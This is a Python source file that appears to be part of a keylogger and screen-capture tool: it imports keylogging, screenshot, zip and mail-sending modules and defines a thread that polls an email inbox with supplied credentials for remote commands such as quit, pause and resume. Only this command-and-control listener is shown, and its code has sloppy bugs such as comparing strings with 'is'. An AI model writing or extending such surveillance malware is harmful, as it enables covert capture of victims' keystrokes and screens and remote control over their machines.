import keyLogger
import screenCap
import threading
import sendMail
from getMail import Mail
import time
import datetime
import zip
import os
from queue import Queue

print_lock = threading.Lock()

class receiveThread(threading.Thread):
	email = ""
	password = ""
	paused = False
	def __init__(self, inQueue, outQueue, args=(), kwargs=None):
		global email
		global password
		global paused
		paused = False
		threading.Thread.__init__(self, args=(), kwargs=None)
		self.inQueue = inQueue
		self.outQueue = outQueue
		self.daemon = False
		self.receive_messages = args[0]
		email = args[1]
		password = args[2]
		
	def isPaused(self):
		global paused
		return paused		
		
	def run(self):
		print(threading.currentThread().getName() + " beginning to listen for messages")
		
		global outputDir
		global email
		global password
		val = ""
		rec = Mail(email, password)
		while True:
			global paused
			val = ""
			if not self.inQueue.empty():
				val = self.inQueue.get()
			if val is "quit": 
				print(threading.currentThread().getName() + " quitting")
				rec.exit()
				return True
			elif val is "pause":
				print(threading.currentThread().getName() + " paused")
				paused = True
			elif val is "resume":
				print(threading.currentThread().getName() + " resumed")
				paused = False
			if not paused:
				now = datetime.datetime.now()
				time.sleep(3)
				action = rec.run()
				if action != "" and action is not None:
					print(action)
					self.outQueue.put(action)